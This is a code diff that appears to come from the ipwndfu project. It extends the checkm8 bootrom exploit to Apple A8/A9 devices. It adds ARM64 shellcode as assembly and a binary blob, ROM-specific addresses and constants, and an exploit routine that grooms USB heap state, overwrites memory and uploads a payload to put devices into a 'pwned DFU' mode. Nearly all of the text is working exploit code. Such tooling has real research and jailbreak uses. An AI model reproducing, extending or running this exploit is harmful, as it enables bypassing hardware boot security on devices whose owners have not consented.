@@ -1,0 +1,316 @@
+diff --git a/Makefile b/Makefile
+index 96e99b7..4884309 100644
+--- a/Makefile
++++ b/Makefile
+@@ -43,6 +43,10 @@ arm64:
+ 	gobjcopy -O binary -j .text bin/checkm8_arm64.o bin/checkm8_arm64.bin
+ 	rm bin/checkm8_arm64.o
+ 
++	xcrun -sdk iphoneos clang src/checkm8_nopaddingcorruption_arm64.S -target arm64-apple-darwin -Wall -o bin/checkm8_nopaddingcorruption_arm64.o
++	gobjcopy -O binary -j .text bin/checkm8_nopaddingcorruption_arm64.o bin/checkm8_nopaddingcorruption_arm64.bin
++	rm bin/checkm8_nopaddingcorruption_arm64.o
++
+ 	xcrun -sdk iphoneos clang src/t8010_t8011_disable_wxn_arm64.S -target arm64-apple-darwin -Wall -o bin/t8010_t8011_disable_wxn_arm64.o
+ 	gobjcopy -O binary -j .text bin/t8010_t8011_disable_wxn_arm64.o bin/t8010_t8011_disable_wxn_arm64.bin
+ 	rm bin/t8010_t8011_disable_wxn_arm64.o
+diff --git a/bin/checkm8_nopaddingcorruption_arm64.bin b/bin/checkm8_nopaddingcorruption_arm64.bin
+new file mode 100644
+index 0000000000000000000000000000000000000000..3a643409a94680346b7f4c3526923babc9bf9003
+GIT binary patch
+literal 312
+zcmXZUF-ikL7zN-rGrQT1rWmlY%B*_^!PsQ7n_4Uc0}_%D1VJpV0ulr(t383(IajcW
+zxq%3qHV5zo3Y+!C%)sOO|M}q^VE$Fj7Oqk##t{Yxta}Whb8TI&dk+79C<JV0S=Yy}
+zydAZylPx&Yz@Wz%bXPmkvD_zBtuvZHK1=qeocl~TM)3svr0iB2E@i*cf@W0GoGND?
+z_RB?Am4GM`CSyiW-}$D#Xy3=>3vX+tnl0Zx)M(X|hY%v1|26{v8v#U#*aKp2+h@)%
+j&-$lV)0^w*?cK=`ZKFzo&-d+3dX+cuhTeuZ^2Xjjb=yuH
+
+literal 0
+HcmV?d00001
+
+diff --git a/checkm8.py b/checkm8.py
+index a2298e9..816d6f3 100644
+--- a/checkm8.py
++++ b/checkm8.py
+@@ -211,6 +211,54 @@ def payload(cpid):
+     assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+     assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
+     return s5l8955x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
++  if cpid == 0x7000:
++    constants_usb_s7000 = [
++               0x180380000, # 1 - LOAD_ADDRESS
++        0x6578656365786563, # 2 - EXEC_MAGIC
++        0x646F6E65646F6E65, # 3 - DONE_MAGIC
++        0x6D656D636D656D63, # 4 - MEMC_MAGIC
++        0x6D656D736D656D73, # 5 - MEMS_MAGIC
++               0x10000EBB4, # 6 - USB_CORE_DO_IO
++    ]
++    constants_checkm8_s7000 = [
++               0x180088760, # 1 - gUSBDescriptors
++               0x1800888C8, # 2 - gUSBSerialNumber
++               0x10000E074, # 3 - usb_create_string_descriptor
++               0x18008062A, # 4 - gUSBSRNMStringDescriptor
++               0x1800E0C00, # 5 - PAYLOAD_DEST
++      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
++        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
++               0x180088878, # 8 - PAYLOAD_PTR
++    ]
++    s7000_handler   = asm_arm64_x7_trampoline(0x10000EEE4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s7000)[4:]
++    s7000_shellcode = prepare_shellcode('checkm8_nopaddingcorruption_arm64', constants_checkm8_s7000)
++    assert len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64
++    assert len(s7000_handler) <= PAYLOAD_SIZE_ARM64
++    return s7000_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s7000_shellcode)) + s7000_handler
++  if cpid == 0x8003:
++    constants_usb_s8003 = [
++               0x180380000, # 1 - LOAD_ADDRESS
++        0x6578656365786563, # 2 - EXEC_MAGIC
++        0x646F6E65646F6E65, # 3 - DONE_MAGIC
++        0x6D656D636D656D63, # 4 - MEMC_MAGIC
++        0x6D656D736D656D73, # 5 - MEMS_MAGIC
++               0x10000EE78, # 6 - USB_CORE_DO_IO
++    ]
++    constants_checkm8_s8003 = [
++               0x1800877E0, # 1 - gUSBDescriptors
++               0x180087958, # 2 - gUSBSerialNumber
++               0x10000E354, # 3 - usb_create_string_descriptor
++               0x1800807DA, # 4 - gUSBSRNMStringDescriptor
++               0x1800E0C00, # 5 - PAYLOAD_DEST
++      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
++        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
++               0x1800878F8, # 8 - PAYLOAD_PTR
++    ]
++    s8003_handler   = asm_arm64_x7_trampoline(0x10000F1B0) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s8003)[4:]
++    s8003_shellcode = prepare_shellcode('checkm8_nopaddingcorruption_arm64', constants_checkm8_s8003)
++    assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
++    assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64
++    return s8003_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode)) + s8003_handler
+   if cpid == 0x8960:
+     constants_usb_s5l8960x = [
+                0x180380000, # 1 - LOAD_ADDRESS
+@@ -460,6 +508,58 @@ def exploit_config(serial_number):
+   print 'ERROR: This is not a compatible device. Exiting.'
+   sys.exit(1)
+ 
++def exploit_a8_a9():
++  print '*** checkm8 exploit by axi0mX ***'
++
++  device = dfu.acquire_device()
++  start = time.time()
++  print 'Found:', device.serial_number
++  if 'PWND:[' in device.serial_number:
++    print 'Device is already in pwned DFU Mode. Not executing exploit.'
++    return
++  padding = 0x400 + 0x80 + 0x80
++  overwrite = struct.pack('<32xQQ', 0x180380000, 0)
++  if 'CPID:8000' in device.serial_number or\
++      'CPID:8003' in device.serial_number:
++    payload_a8_a9 = payload(0x8003)
++  elif 'CPID:7000' in device.serial_number:
++    payload_a8_a9 = payload(0x7000)
++
++  stall(device)
++  leak(device)
++  for i in range(40):
++      no_leak(device)
++  dfu.usb_reset(device)
++  dfu.release_device(device)
++
++  device = dfu.acquire_device()
++  device.serial_number
++  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
++  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * padding, 10)
++  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
++  dfu.release_device(device)
++
++  time.sleep(0.5)
++
++  device = dfu.acquire_device()
++  usb_req_stall(device)
++  usb_req_leak(device)
++  usb_req_leak(device)
++  usb_req_leak(device)
++  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, overwrite, 100)
++  for i in range(0, len(payload_a8_a9), 0x800):
++    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload_a8_a9[i:i+0x800], 100)
++  dfu.usb_reset(device)
++  dfu.release_device(device)
++
++  device = dfu.acquire_device()
++  if 'PWND:[checkm8]' not in device.serial_number:
++    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
++    sys.exit(1)
++  print 'Device is now in pwned DFU Mode.'
++  print '(%0.2f seconds)' % (time.time() - start)
++  dfu.release_device(device)
++
+ def exploit():
+   print '*** checkm8 exploit by axi0mX ***'
+ 
+diff --git a/device_platform.py b/device_platform.py
+index bbd04c2..4934f48 100644
+--- a/device_platform.py
++++ b/device_platform.py
+@@ -29,6 +29,11 @@ class DevicePlatform:
+       self.dfu_load_base       = 0x180000000 # varies (HACK: test purposes)
+       self.recovery_image_base = 0x83D7F7000 # varies
+       self.recovery_load_base  = 0x800000000
++    if self.cpid in [0x8000, 0x8003, 0x7000]:
++      self.dfu_image_base      = 0x180380000
++      self.dfu_load_base       = 0x180000000 # varies (HACK: test purposes)
++      self.recovery_image_base = 0x83D7F7000 # varies
++      self.recovery_load_base  = 0x800000000
+     if self.cpid in [0x8002, 0x8004]:
+       self.dfu_image_base      = 0x48818000
+       self.dfu_load_base       = 0x80000000
+@@ -96,6 +101,27 @@ all_platforms = [
+     nonce_length=20, sep_nonce_length=20,
+     demotion_reg=0x20E02A000,
+   ),
++  DevicePlatform(cpid=0x7000, cprv=0x11, scep=0x01, arch='arm64', srtg='iBoot-1992.0.0.1.19',
++    rom_base=0x100000000, rom_size=0x80000, rom_sha1='c4dcd22ae135c14244fc2b62165c85effa566bfe',
++    sram_base=0x180000000, sram_size=0x400000,
++    dram_base=0x800000000,
++    nonce_length=20, sep_nonce_length=20,
++    demotion_reg=0x20E02A000,
++  ),
++  DevicePlatform(cpid=0x8000, cprv=0x20, scep=0x01, arch='arm64', srtg='"iBoot-2234.0.0.3.3',
++    rom_base=0x100000000, rom_size=0x80000, rom_sha1='9979dce30e913c888cf77234c7a7e2a7fa676f4c',
++    sram_base=0x180000000, sram_size=0x400000,
++    dram_base=0x800000000,
++    nonce_length=32, sep_nonce_length=20,
++    demotion_reg=0x2102BC000,
++  ),
++  DevicePlatform(cpid=0x8003, cprv=0x01, scep=0x01, arch='arm64', srtg='iBoot-2234.0.0.2.22',
++    rom_base=0x100000000, rom_size=0x80000, rom_sha1='93d69e2430e2f0c161e3e1144b69b4da1859169b',
++    sram_base=0x180000000, sram_size=0x400000,
++    dram_base=0x800000000,
++    nonce_length=32, sep_nonce_length=20,
++    demotion_reg=0x2102BC000,
++  ),
+   DevicePlatform(cpid=0x8010, cprv=0x11, scep=0x01, arch='arm64', srtg='iBoot-2696.0.0.1.33',
+     rom_base=0x100000000, rom_size=0x20000, rom_sha1='41a488b3c46ff06c1a2376f3405b079fb0f15316',
+     sram_base=0x180000000, sram_size=0x200000,
+diff --git a/ipwndfu b/ipwndfu
+index c90d17b..a0b3ab8 100755
+--- a/ipwndfu
++++ b/ipwndfu
+@@ -67,6 +67,12 @@ if __name__ == '__main__':
+                 checkm8.exploit()
+             elif 'CPID:8002' in serial_number:
+                 checkm8.exploit()
++            elif 'CPID:7000' in serial_number:
++                checkm8.exploit_a8_a9()
++            elif 'CPID:8000' in serial_number:
++                checkm8.exploit_a8_a9()
++            elif 'CPID:8003' in serial_number:
++                checkm8.exploit_a8_a9()
+             elif 'CPID:8004' in serial_number:
+                 checkm8.exploit()
+             elif 'CPID:8010' in serial_number:
+diff --git a/src/checkm8_nopaddingcorruption_arm64.S b/src/checkm8_nopaddingcorruption_arm64.S
+new file mode 100644
+index 0000000..a3660af
+--- /dev/null
++++ b/src/checkm8_nopaddingcorruption_arm64.S
+@@ -0,0 +1,80 @@
++.text
++
++.pool
++.set PAYLOAD_OFFSET,               0xBAD00006
++.set PAYLOAD_SIZE,                 0xBAD00007
++.set PAYLOAD_DEST,                 0xBAD00005
++.set PAYLOAD_PTR,                  0xBAD00008
++.set gUSBSerialNumber,             0xBAD00002
++.set gUSBSRNMStringDescriptor,     0xBAD00004
++.set gUSBDescriptors,              0xBAD00001
++.set usb_create_string_descriptor, 0xBAD00003
++
++.global _main
++_main:
++  MOV  X19, #0                      // HACK: do not free this usb request
++  STP  X29, X30, [SP,#-0x10]!
++  MOV  X29, SP
++
++  LDR  X0, =gUSBDescriptors
++  LDP  X0, X1, [X0]
++  ADR  X2, USB_DESCRIPTOR
++  LDP  X3, X4, [X2]
++  LDP  X3, X4, [X2,#0x10]
++
++  LDR  X0, =gUSBSerialNumber
++find_zero_loop:
++  ADD  X0, X0, #1
++  LDRB W1, [X0]
++  CBNZ W1, find_zero_loop
++
++  ADR  X1, PWND_STRING
++  LDP  X2, X3, [X1]
++  STP  X2, X3, [X0]
++
++  LDR  X0, =gUSBSerialNumber
++  LDR  X1, =usb_create_string_descriptor
++  BLR  X1
++
++  LDR  X1, =gUSBSRNMStringDescriptor
++  STRB W0, [X1]
++
++  LDR  X0, =PAYLOAD_DEST
++  ADR  X1, _main
++  LDR  X2, =PAYLOAD_OFFSET
++  ADD  X1, X1, X2
++  MOV  X2, #0
++  LDR  X3, =PAYLOAD_SIZE
++  LDR  X4, =PAYLOAD_PTR
++  ADD  X5, X0, #0x18
++  STR  X5, [X4]
++
++copy_loop:
++  LDP  X3, X4,  [X1]
++  STP  X3, X4,  [X0]
++  LDP  X3, X4,  [X1,#0x10]
++  STP  X3, X4,  [X0,#0x10]
++  LDP  X3, X4,  [X1,#0x20]
++  STP  X3, X4,  [X0,#0x20]
++  LDP  X3, X4,  [X1,#0x30]
++  STP  X3, X4,  [X0,#0x30]
++  DC   CIVAC, X0
++  DMB  SY
++  ADD  X0, X0, #0x40
++  ADD  X1, X1, #0x40
++  ADD  X2, X2, #0x40
++  CMP  X2, X3
++  B.CC copy_loop
++
++  SYS  #0, c7, c5, #0
++  DSB  SY
++  ISB
++
++  LDP  X29, X30, [SP],#0x10
++  RET
++
++USB_DESCRIPTOR:
++.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
++
++PWND_STRING:
++.asciz " PWND:[checkm8]"
+diff --git a/usbexec.py b/usbexec.py
+index 43e2bc7..067f027 100644
+--- a/usbexec.py
++++ b/usbexec.py
+@@ -19,13 +19,16 @@ configs = [
+   ExecConfig(('SecureROM for t8010si, Copyright 2007-2015, Apple Inc.', 'ROMRELEASE',  'iBoot-2696.0.0.1.33'),   aes_crypto_cmd=0x10000C8F4),
+   ExecConfig(('SecureROM for t8011si, Copyright 2007-2015, Apple Inc.', 'ROMRELEASE',  'iBoot-3135.0.0.2.3'),    aes_crypto_cmd=0x10000C994),
+   ExecConfig(('SecureROM for t8015si, Copyright 2007-2016, Apple Inc.', 'ROMRELEASE',  'iBoot-3332.0.0.1.23'),   aes_crypto_cmd=0x100009E9C),
++  ExecConfig(('SecureROM for s8000si, Copyright 2007-2014, Apple Inc.', 'RELEASE',     'iBoot-2234.0.0.3.3'),    aes_crypto_cmd=0x10000DAA0),
++  ExecConfig(('SecureROM for s8003si, Copyright 2007-2014, Apple Inc.', 'RELEASE',     'iBoot-2234.0.0.2.22'),   aes_crypto_cmd=0x10000DAA0),
++  ExecConfig(('SecureROM for t7000si, Copyright 2013, Apple Inc.',      'RELEASE',     'iBoot-1992.0.0.1.19'),   aes_crypto_cmd=0x10000DA90),
+ ]
+ 
+ EXEC_MAGIC = 'execexec'[::-1]
+ DONE_MAGIC = 'donedone'[::-1]
+ MEMC_MAGIC = 'memcmemc'[::-1]
+ MEMS_MAGIC = 'memsmems'[::-1]
+-USB_READ_LIMIT  = 0x8000
++USB_READ_LIMIT  = 0x800
+ CMD_TIMEOUT     = 5000
+ AES_BLOCK_SIZE  = 16
+ AES_ENCRYPT     = 16
